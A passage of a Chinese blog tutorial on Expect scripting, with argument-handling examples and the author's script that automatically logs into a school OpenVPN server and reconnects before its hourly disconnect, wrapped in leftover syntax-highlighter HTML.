class="crayon-sy"&gt;]&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320430229454941-5"&gt;&lt;span class="crayon-i"&gt;send_user&lt;/span&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-s"&gt;"UserName is $username\n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320430229454941-6"&gt;&lt;span class="crayon-i"&gt;send_user&lt;/span&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-s"&gt;"PassWord is $password\n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320430229454941-7"&gt;&lt;span class="crayon-i"&gt;send_user&lt;/span&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-s"&gt;"Server is $server\n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320430229454941-8"&gt;&lt;span class="crayon-i"&gt;send_user&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"Total arg num is $argc\n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320430229454941-9"&gt;&lt;span class="crayon-i"&gt;send_user&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"last but one arg is[lindex $argv [expr $argc-1]]\n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320430229454941-10"&gt;&lt;span class="crayon-st"&gt;if&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-v"&gt;$argc&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-o"&gt;!=&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;3&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-v"&gt;$argc&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-o"&gt;!=&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;2&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320430229454941-11"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-i"&gt;send_user&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"Usage:username password \[server\] \n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320430229454941-12"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-i"&gt;send_user&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"\tthe default server is 211.65.64.1 \n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320430229454941-13"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-r"&gt;exit&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320430229454941-14"&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;

                &lt;/tr&gt;

            &lt;/table&gt;

        &lt;/div&gt;

    &lt;/div&gt;
</code></pre>

<!-- [Format Time: 0.0039 seconds] -->




<p></p>


<p>执行这个文件./launch.exp 1 2 3<br />
屏幕上就会分别打印出参数<br />
send_user用来发送内容给用户。</p>


<p>参数运用方面还有很多技巧<br />
比如$argc 存储了参数个数，args被结构化成一个列表存在argv。$argv0 被初始化为脚本名字。<br />
除此之外，如果你在第一行(#!那行)使用-d (debug参数)，可以在运行的时候输出一些很有用的信息<br />
比如你会看见</p>


<blockquote><p>argv[0] = /usr/bin/expect  argv[1] = -d  argv[2] = ./launch.exp  argv[3] = 1  argv[4] = 2  argv[5] = 3</p></blockquote>


<p>使用这些也可以完成参数传递</p>


<p>另外在spawn后面加一个interact,会从自动交互状态退出到输入状态，由用户完成剩余的操作.<br />
ecpect也支持使用逻辑结构。基本语法和大多数shell语言；类似，不过使用{}而不是()<br />
另外花括号前后的空格不容小觑，不写就会报错.</p>


<p>&#8211; 是用来为划定选项尾的。<br />
当需要像使用选项一样传一个参数，但希望这个参数不要被当作选项解释时，就需要用到这个选项。当阻止其他选项时，可以把它放在”#!”行中<br />
#!/usr/local/bin/expect &#8211;<br />
会让所有参数（包括脚本文件名）都存储在argv中。</p>


<hr />


<p>openVPN 59min重连脚本<br />
学校的OpenVPN服务器非常恶心，每当用户登录时间经过60 min 09 s后就把用户踢下线。为了解决这个问日，我使用这个expect脚本来完成这个目的</p></p>

<p></p>


<!-- Crayon Syntax Highlighter v2.5.0 -->


<pre><code>    &lt;div id="crayon-53145a9320440188879649" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;"&gt;



        &lt;div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"&gt;&lt;span class="crayon-title"&gt;&lt;/span&gt;

        &lt;div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"&gt;&lt;div class="crayon-button crayon-nums-button" title="切换显示行编号"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-plain-button" title="纯文本显示代码"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-wrap-button" title="切换自动换行"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-expand-button" title="Expand Code"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-copy-button" title="Copy"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;span class="crayon-language"&gt;Shell&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;

        &lt;div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"&gt;&lt;/div&gt;

        &lt;div class="crayon-plain-wrap"&gt;&lt;textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;"&gt;
</code></pre>

<h1>!/usr/bin/expect</h1>

<h1>openVPN 59min 自动重连脚本</h1>

<h1>By <a href="http://ihipop.info">http://ihipop.info</a></h1>

<h1>2010-12-26 11:21</h1>

<p>set timeout 30</p>

<p>set username [lindex $argv 0]</p>

<p>set password [lindex $argv 1]</p>

<h1>set server [lindex $argv 2]</h1>

<h1>send_user  &ldquo;UserName is $username\n&rdquo;</h1>

<h1>send_user &ldquo;Filename is $argv0 ,and args No.1-2 is :[lrange $argv 1 2] \n&rdquo;</h1>

<h1>send_user &ldquo;Total arg num is $argc\n&rdquo;</h1>

<p>if { $argc != 3 &amp;&amp; $argc != 2 } {</p>

<pre><code>send_user "Usage:username password \[server\] \n"

send_user "\tthe default server is 211.65.64.1 \n"

exit
</code></pre>

<p>}</p>

<p>spawn openvpn &mdash;config  rnas-school.ovpn</p>

<p>expect &ldquo;Enter Auth Username:&rdquo;</p>

<p>send &ldquo;$username\r&rdquo;</p>

<p>expect &ldquo;Enter Auth Password:&rdquo;</p>

<p>send &ldquo;$password\r&rdquo;</p>

<p>expect &ldquo;Initialization Sequence Completed&rdquo;</p>

<h1>interact</h1>

<h1>等待59min后结束spawn</h1>

<h1>exec sleep 3540</h1>

<p>set timeout 3540</p>

<p>exit</textarea></div></p>

<pre><code>        &lt;div class="crayon-main" style=""&gt;

            &lt;table class="crayon-table"&gt;

                &lt;tr class="crayon-row"&gt;

            &lt;td class="crayon-nums " data-settings="show"&gt;

                &lt;div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320440188879649-1"&gt;1&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320440188879649-2"&gt;2&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320440188879649-3"&gt;3&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320440188879649-4"&gt;4&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320440188879649-5"&gt;5&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320440188879649-6"&gt;6&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320440188879649-7"&gt;7&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320440188879649-8"&gt;8&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320440188879649-9"&gt;9&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320440188879649-10"&gt;10&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320440188879649-11"&gt;11&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320440188879649-12"&gt;12&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320440188879649-13"&gt;13&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320440188879649-14"&gt;14&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320440188879649-15"&gt;15&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320440188879649-16"&gt;16&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320440188879649-17"&gt;17&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320440188879649-18"&gt;18&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320440188879649-19"&gt;19&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320440188879649-20"&gt;20&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320440188879649-21"&gt;21&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320440188879649-22"&gt;22&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320440188879649-23"&gt;23&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320440188879649-24"&gt;24&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320440188879649-25"&gt;25&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320440188879649-26"&gt;26&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320440188879649-27"&gt;27&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320440188879649-28"&gt;28&lt;/div&gt;&lt;/div&gt;

            &lt;/td&gt;

                    &lt;td class="crayon-code"&gt;&lt;div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"&gt;&lt;div class="crayon-line" id="crayon-53145a9320440188879649-1"&gt;&lt;span class="crayon-p"&gt;#!/usr/bin/expect&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320440188879649-2"&gt;&lt;span class="crayon-p"&gt;#openVPN 59min 自动重连脚本&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320440188879649-3"&gt;&lt;span class="crayon-p"&gt;#By http://ihipop.info&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320440188879649-4"&gt;&lt;span class="crayon-p"&gt;#2010-12-26 11:21&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320440188879649-5"&gt;&amp;nbsp;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320440188879649-6"&gt;&lt;span class="crayon-e"&gt;set &lt;/span&gt;&lt;span class="crayon-i"&gt;timeout&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;30&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320440188879649-7"&gt;&lt;span class="crayon-e"&gt;set &lt;/span&gt;&lt;span class="crayon-v"&gt;username&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;[&lt;/span&gt;&lt;span class="crayon-i"&gt;lindex&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-v"&gt;$argv&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;0&lt;/span&gt;&lt;span class="crayon-sy"&gt;]&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320440188879649-8"&gt;&lt;span class="crayon-e"&gt;set &lt;/span&gt;&lt;span class="crayon-v"&gt;password&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;[&lt;/span&gt;&lt;span class="crayon-i"&gt;lindex&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-v"&gt;$argv&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;1&lt;/span&gt;&lt;span class="crayon-sy"&gt;]&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320440188879649-9"&gt;&lt;span class="crayon-p"&gt;#set server [lindex $argv 2]&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320440188879649-10"&gt;&lt;span class="crayon-p"&gt;#send_user&amp;nbsp;&amp;nbsp;"UserName is $username\n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320440188879649-11"&gt;&lt;span class="crayon-p"&gt;#send_user "Filename is $argv0 ,and args No.1-2 is :[lrange $argv 1 2] \n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320440188879649-12"&gt;&lt;span class="crayon-p"&gt;#send_user "Total arg num is $argc\n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320440188879649-13"&gt;&lt;span class="crayon-st"&gt;if&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-v"&gt;$argc&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-o"&gt;!=&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;3&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-v"&gt;$argc&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-o"&gt;!=&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;2&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320440188879649-14"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-i"&gt;send_user&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"Usage:username password \[server\] \n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320440188879649-15"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-i"&gt;send_user&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"\tthe default server is 211.65.64.1 \n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320440188879649-16"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-r"&gt;exit&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320440188879649-17"&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320440188879649-18"&gt;&lt;span class="crayon-e"&gt;spawn &lt;/span&gt;&lt;span class="crayon-i"&gt;openvpn&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-o"&gt;--&lt;/span&gt;&lt;span class="crayon-e"&gt;config&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-i"&gt;rnas&lt;/span&gt;&lt;span class="crayon-o"&gt;-&lt;/span&gt;&lt;span class="crayon-v"&gt;school&lt;/span&gt;&lt;span class="crayon-e"&gt;.ovpn&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320440188879649-19"&gt;&lt;span class="crayon-i"&gt;expect&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"Enter Auth Username:"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320440188879649-20"&gt;&lt;span class="crayon-i"&gt;send&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"$username\r"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320440188879649-21"&gt;&lt;span class="crayon-i"&gt;expect&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"Enter Auth Password:"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320440188879649-22"&gt;&lt;span class="crayon-i"&gt;send&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"$password\r"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320440188879649-23"&gt;&lt;span class="crayon-i"&gt;expect&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"Initialization Sequence Completed"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320440188879649-24"&gt;&lt;span class="crayon-p"&gt;#interact&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320440188879649-25"&gt;&lt;span class="crayon-p"&gt;#等待59min后结束spawn&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320440188879649-26"&gt;&lt;span class="crayon-p"&gt;#exec sleep 3540&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320440188879649-27"&gt;&lt;span class="crayon-e"&gt;set &lt;/span&gt;&lt;span class="crayon-i"&gt;timeout&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;3540&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320440188879649-28"&gt;&lt;span class="crayon-r"&gt;exit&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;

                &lt;/tr&gt;

            &lt;/table&gt;

        &lt;/div&gt;

    &lt;/div&gt;
</code></pre>

<!-- [Format Time: 0.0062 seconds] -->




<p></p>


<p>然后上层用一个bash的永真循环来调用这个脚本，传递参数即可。</p>


<hr />


<h4>并行结构</h4>


<p>上面的脚本是串行结构，其结果就是，当事态不按照他的发展来的时候，比如出现了异常输出输入请求，但是expect没有匹配到，expect就会一直等待到timeout(默认是10s)<br />
所以为了增加程序健壮性，应该考虑使用并行结构</p>


<p></p>


<!-- Crayon Syntax Highlighter v2.5.0 -->


<pre><code>    &lt;div id="crayon-53145a9320449729472440" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;"&gt;



        &lt;div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"&gt;&lt;span class="crayon-title"&gt;&lt;/span&gt;

        &lt;div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"&gt;&lt;div class="crayon-button crayon-nums-button" title="切换显示行编号"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-plain-button" title="纯文本显示代码"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-wrap-button" title="切换自动换行"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-expand-button" title="Expand Code"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-copy-button" title="Copy"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;span class="crayon-language"&gt;Shell&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;

        &lt;div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"&gt;&lt;/div&gt;

        &lt;div class="crayon-plain-wrap"&gt;&lt;textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;"&gt;
</code></pre>

<h1>!/usr/bin/expect</h1>

<h1>openVPN 59min 自动重连脚本</h1>

<h1>By <a href="http://ihipop.info">http://ihipop.info</a></h1>

<h1>2010-12-26 11:21</h1>

<p>set timeout 30</p>

<p>set username [lindex $argv 0]</p>

<p>set password [lindex $argv 1]</p>

<h1>set server [lindex $argv 2]</h1>

<h1>send_user  &ldquo;UserName is $username\n&rdquo;</h1>

<h1>send_user &ldquo;Filename is $argv0 ,and args No.1-2 is :[lrange $argv 1 2] \n&rdquo;</h1>

<h1>send_user &ldquo;Total arg num is $argc\n&rdquo;</h1>

<p>if { $argc != 3 &amp;&amp; $argc != 2 } {</p>

<pre><code>send_user "Usage:username password \[server\] \n"

send_user "\tthe default server is 211.65.64.1 \n"

exit
</code></pre>

<p>}</p>

<p>spawn openvpn &mdash;config  rnas-school.ovpn</p>

<p>expect {</p>

<p> &ldquo;Enter Auth Username:&rdquo; {</p>

<p>  send &ldquo;$username\r&rdquo;</p>

<p>  exp_continue</p>

<p> }</p>

<p> &ldquo;Enter Auth Password:&rdquo; {</p>

<p>   send &ldquo;$password\r&rdquo;</p>

<p>   exp_continue</p>

<p> }</p>

<p> &ldquo;Initialization Sequence Completed&rdquo; {</p>

<p>   #interact</p>

<p>   set timeout 3540</p>

<p>   #set timeout 3</p>

<p>   exp_continue</p>

<p> }</p>

<p> &ldquo;AUTH: Received AUTH_FAILED control message&rdquo; {</p>

<p>   #interact</p>

<p>   send_user &ldquo;AUTH_FAILED\n&rdquo;</p>

<p>   exit</p>

<p> }</p>

<p> eof {</p>

<p>   send_user &ldquo;eof\n&rdquo;</p>

<p>   exit</p>

<p> }</p>

<p> timeout {</p>

<p>   send \003</p>

<p>   send_user &ldquo;timeout \n&rdquo;</p>

<p>   exit</p>

<p> }</p>

<p>}</textarea></div></p>

<pre><code>        &lt;div class="crayon-main" style=""&gt;

            &lt;table class="crayon-table"&gt;

                &lt;tr class="crayon-row"&gt;

            &lt;td class="crayon-nums " data-settings="show"&gt;

                &lt;div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-1"&gt;1&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-2"&gt;2&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-3"&gt;3&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-4"&gt;4&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-5"&gt;5&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-6"&gt;6&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-7"&gt;7&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-8"&gt;8&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-9"&gt;9&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-10"&gt;10&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-11"&gt;11&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-12"&gt;12&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-13"&gt;13&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-14"&gt;14&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-15"&gt;15&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-16"&gt;16&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-17"&gt;17&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-18"&gt;18&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-19"&gt;19&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-20"&gt;20&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-21"&gt;21&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-22"&gt;22&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-23"&gt;23&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-24"&gt;24&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-25"&gt;25&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-26"&gt;26&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-27"&gt;27&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-28"&gt;28&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-29"&gt;29&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-30"&gt;30&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-31"&gt;31&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-32"&gt;32&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-33"&gt;33&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-34"&gt;34&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-35"&gt;35&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-36"&gt;36&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-37"&gt;37&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" 